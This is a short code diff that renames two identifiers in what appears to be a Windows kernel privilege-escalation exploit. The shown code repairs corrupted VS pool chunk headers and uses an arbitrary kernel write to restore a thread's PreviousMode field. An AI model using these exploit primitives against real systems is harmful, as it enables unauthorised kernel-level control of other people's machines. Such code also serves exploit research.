@@ -8,7 +8,7 @@
 #include "primitives/arbitrary_write.h"
 #include "pipe_utils/pipe_utils.h"
 
-int FixVsChunks(exploit_addresses_t* addrs)
+int FixVsChunkHeaders(exploit_addresses_t* addrs)
 {
     uint64_t new_header[2] = { 0 };
 
@@ -45,7 +45,7 @@ int RestorePreviousMode(exploit_addresses_t* addrs)
 {
     puts("[*] Restoring PreviousMode to its original value (1)");
     char one = 0x01;
-    ArbitraryWrite(addrs->self_kthread + KTHREAD_PREVIOUS_MODE_OFFSET, &one, sizeof(char));
+    ArbitraryWrite(addrs->self_kthread + KTHREAD_PreviousMode_OFFSET, &one, sizeof(char));
 
     return 1;
 }
